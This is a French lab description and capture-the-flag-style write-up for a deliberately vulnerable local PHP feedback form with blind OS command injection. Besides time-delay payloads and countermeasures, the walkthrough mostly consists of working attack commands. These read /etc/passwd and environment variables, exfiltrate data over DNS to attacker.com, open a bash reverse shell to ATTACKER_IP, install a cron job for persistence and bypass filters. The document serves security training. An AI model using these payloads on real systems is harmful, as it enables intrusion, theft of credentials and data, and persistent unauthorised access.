# OS Command Injection with Time Delays - Lab Description

## Vue d'ensemble

Ce laboratoire présente une vulnérabilité d'injection de commandes OS aveugle (blind) dans une application web PHP. L'application exécute des commandes shell contenant des données fournies par l'utilisateur sans validation appropriée.

## Architecture de l'Application

### Technologies Utilisées
- **Backend**: PHP 8.1 avec Apache
- **Frontend**: HTML5, TailwindCSS (thème sombre)
- **Containerisation**: Docker avec docker-compose
- **Port**: 3206

### Structure de l'Application
- **Page d'accueil** (`index.php`): Présentation de l'entreprise TechCorp
- **Système de feedback** (`feedback.php`): Formulaire vulnérable à l'injection de commandes
- **Panneau d'administration** (`admin.php`): Interface de monitoring

## Vulnérabilité

### Localisation
La vulnérabilité se trouve dans le fichier `feedback.php` à la ligne 15-17 :

```php
$email_validation_cmd = "echo 'Validating email: " . $email . "'";
$output = shell_exec($email_validation_cmd);
```

### Mécanisme
1. L'utilisateur soumet un formulaire de feedback
2. Le paramètre `email` est directement concaténé dans une commande shell
3. La commande est exécutée via `shell_exec()`
4. Aucune validation ou échappement n'est effectué

### Type de Vulnérabilité
- **Blind OS Command Injection**: L'output de la commande n'est pas retourné dans la réponse
- **Time-based exploitation**: L'exploitation se fait via des délais temporels

## Exploitation

### Objectif
Causer un délai de 10 secondes pour confirmer l'exécution de commandes arbitraires.

### Payload d'Exploitation
```
x||ping+-c+10+127.0.0.1||
```

### Explication du Payload
- `x`: Valeur factice pour le premier echo
- `||`: Opérateur OR logique pour exécuter la commande suivante
- `ping+-c+10+127.0.0.1`: Commande ping avec 10 paquets vers localhost
- `||`: Opérateur OR pour continuer l'exécution

### Autres Payloads Possibles
```
x||sleep+10||
x||curl+-m+10+http://127.0.0.1:9999||
x||nc+-w+10+127.0.0.1+80||
```

## Méthodes de Détection

### 1. Time-based Detection
- Soumettre des payloads avec des délais croissants
- Observer les temps de réponse
- Confirmer l'exécution par les délais

### 2. Out-of-band Detection
- Utiliser des commandes qui génèrent du trafic réseau
- Monitorer les logs réseau
- Utiliser des services externes (DNS, HTTP)

### 3. Error-based Detection
- Tester des commandes qui génèrent des erreurs
- Observer les messages d'erreur dans les logs
- Analyser les réponses d'erreur

## Contre-mesures

### 1. Validation d'Entrée
```php
// Validation stricte des emails
if (!filter_var($email, FILTER_VALIDATE_EMAIL)) {
    die("Email invalide");
}
```

### 2. Échappement des Caractères
```php
// Échappement des caractères spéciaux
$email = escapeshellarg($email);
```

### 3. Utilisation d'Alternatives Sûres
```php
// Utiliser des fonctions PHP natives au lieu de shell_exec
$email_parts = explode('@', $email);
$domain = $email_parts[1] ?? '';
```

### 4. Liste Blanche
```php
// Autoriser seulement les domaines connus
$allowed_domains = ['example.com', 'company.com'];
if (!in_array($domain, $allowed_domains)) {
    die("Domaine non autorisé");
}
```

## Scénarios d'Apprentissage

### Niveau Débutant
- Comprendre le concept d'injection de commandes
- Identifier les points d'injection
- Tester des payloads simples

### Niveau Intermédiaire
- Exploiter des vulnérabilités blind
- Utiliser des techniques time-based
- Éviter les filtres de sécurité

### Niveau Avancé
- Développer des payloads personnalisés
- Contourner les WAF
- Exfiltration de données via OOB

## Ressources Additionnelles

- [OWASP Command Injection](https://owasp.org/www-community/attacks/Command_Injection)
- [PortSwigger OS Command Injection](https://portswigger.net/web-security/os-command-injection)
- [PayloadsAllTheThings - Command Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection)

---

# 🎯 WRITEUP COMPLET - Solution Détaillée

## Étape 1 : Reconnaissance

### 1.1 Analyse de l'Application
L'application présente trois pages principales :
- **Page d'accueil** : Présentation de TechCorp
- **Formulaire de feedback** : Point d'entrée vulnérable
- **Panneau d'administration** : Interface de monitoring

### 1.2 Identification de la Vulnérabilité
En analysant le code source de `feedback.php`, on identifie la vulnérabilité :

```php
$email_validation_cmd = "echo 'Validating email: " . $email . "'";
$output = shell_exec($email_validation_cmd);
```

Le paramètre `$email` est directement concaténé dans une commande shell sans validation.

## Étape 2 : Exploitation

### 2.1 Test de Base
Commencer par tester si l'injection fonctionne :

**Payload de test :**
```
test@example.com; whoami
```

**Résultat :** Aucune sortie visible (blind injection)

### 2.2 Confirmation via Time-based
Utiliser un délai pour confirmer l'exécution :

**Payload de confirmation :**
```
test@example.com; sleep 5
```

**Résultat :** Délai de 5 secondes observé

### 2.3 Exploitation avec Redirection
Utiliser la redirection de sortie pour extraire des informations :

**Payload pour extraire /etc/passwd :**
```
test@example.com; cat /etc/passwd > /var/www/html/passwd.txt
```

**Accès au fichier :**
```
http://localhost:3206/passwd.txt
```

## Étape 3 : Exfiltration de Données

### 3.1 Extraction de Fichiers Système
```bash
# Liste des utilisateurs
test@example.com; cat /etc/passwd > /var/www/html/users.txt

# Informations système
test@example.com; uname -a > /var/www/html/system.txt

# Liste des processus
test@example.com; ps aux > /var/www/html/processes.txt

# Variables d'environnement
test@example.com; env > /var/www/html/environment.txt
```

### 3.2 Exploration du Système de Fichiers
```bash
# Lister le répertoire courant
test@example.com; ls -la > /var/www/html/current_dir.txt

# Explorer /etc
test@example.com; ls -la /etc > /var/www/html/etc_contents.txt

# Chercher des fichiers sensibles
test@example.com; find / -name "*.conf" -type f 2>/dev/null > /var/www/html/config_files.txt
```

## Étape 4 : Techniques Avancées

### 4.1 Bypass de Filtres
Si des filtres sont en place, utiliser des techniques de contournement :

```bash
# Encodage URL
test@example.com; cat /etc/passwd | base64 > /var/www/html/passwd_b64.txt

# Utilisation de variables
test@example.com; a=cat; b=/etc/passwd; $a $b > /var/www/html/passwd_var.txt

# Concatenation
test@example.com; c"a"t /etc/passwd > /var/www/html/passwd_concat.txt
```

### 4.2 Exfiltration via DNS
```bash
# Utiliser nslookup pour exfiltrer des données
test@example.com; nslookup $(cat /etc/passwd | head -1 | base64).attacker.com
```

### 4.3 Reverse Shell (Optionnel)
```bash
# Créer un reverse shell
test@example.com; bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1'
```

## Étape 5 : Post-Exploitation

### 5.1 Élévation de Privilèges
```bash
# Vérifier les permissions sudo
test@example.com; sudo -l > /var/www/html/sudo_perms.txt

# Chercher des fichiers SUID
test@example.com; find / -perm -4000 2>/dev/null > /var/www/html/suid_files.txt
```

### 5.2 Persistance
```bash
# Créer un cron job
test@example.com; echo "* * * * * /bin/bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1'" | crontab -
```

## Étape 6 : Nettoyage et Documentation

### 6.1 Suppression des Fichiers de Preuve
```bash
# Supprimer les fichiers créés
test@example.com; rm -f /var/www/html/*.txt
```

### 6.2 Documentation de l'Exploit
Documenter tous les payloads utilisés et les résultats obtenus pour référence future.

## 🔧 Outils Recommandés

### Outils de Test
- **Burp Suite** : Interception et modification des requêtes
- **OWASP ZAP** : Scanner de vulnérabilités
- **Nmap** : Découverte de ports et services

### Scripts d'Automatisation
```python
import requests
import time

def test_injection(payload):
    data = {
        'name': 'Test',
        'email': payload,
        'message': 'Test message'
    }
    
    start_time = time.time()
    response = requests.post('http://localhost:3206/feedback.php', data=data)
    end_time = time.time()
    
    return end_time - start_time

# Test de délai
delay = test_injection('test@example.com; sleep 5')
print(f"Délai observé : {delay} secondes")
```

## 🛡️ Contre-mesures Recommandées

### 1. Validation Stricte
```php
// Validation d'email stricte
if (!filter_var($email, FILTER_VALIDATE_EMAIL)) {
    die("Email invalide");
}

// Liste blanche de domaines
$allowed_domains = ['example.com', 'company.com'];
$domain = substr(strrchr($email, "@"), 1);
if (!in_array($domain, $allowed_domains)) {
    die("Domaine non autorisé");
}
```

### 2. Échappement Approprié
```php
// Utiliser escapeshellarg pour tous les inputs
$email = escapeshellarg($email);
$name = escapeshellarg($name);
$message = escapeshellarg($message);
```

### 3. Alternatives Sûres
```php
// Utiliser des fonctions PHP natives
$email_parts = explode('@', $email);
$domain = $email_parts[1] ?? '';

// Validation de domaine
if (!checkdnsrr($domain, 'MX')) {
    die("Domaine invalide");
}
```

### 4. Monitoring et Logging
```php
// Logger toutes les tentatives d'injection
$suspicious_patterns = [';', '|', '&', '`', '$('];
foreach ($suspicious_patterns as $pattern) {
    if (strpos($email, $pattern) !== false) {
        error_log("Tentative d'injection détectée: " . $email);
        die("Caractère non autorisé détecté");
    }
}
```

## 📊 Métriques de Sécurité

### Temps de Réponse
- **Normal** : < 1 seconde
- **Injection détectée** : > 5 secondes
- **Exploitation réussie** : Délai correspondant au payload

### Fichiers Créés
- **passwd.txt** : Liste des utilisateurs
- **system.txt** : Informations système
- **processes.txt** : Processus en cours
- **environment.txt** : Variables d'environnement

## 🎯 Objectifs d'Apprentissage Atteints

✅ **Compréhension des injections aveugles**
✅ **Maîtrise des techniques de redirection**
✅ **Exploitation time-based**
✅ **Exfiltration de données**
✅ **Contournement de filtres**
✅ **Post-exploitation**

---

*Ce writeup démontre une exploitation complète de la vulnérabilité d'injection de commande OS aveugle avec redirection de sortie.* 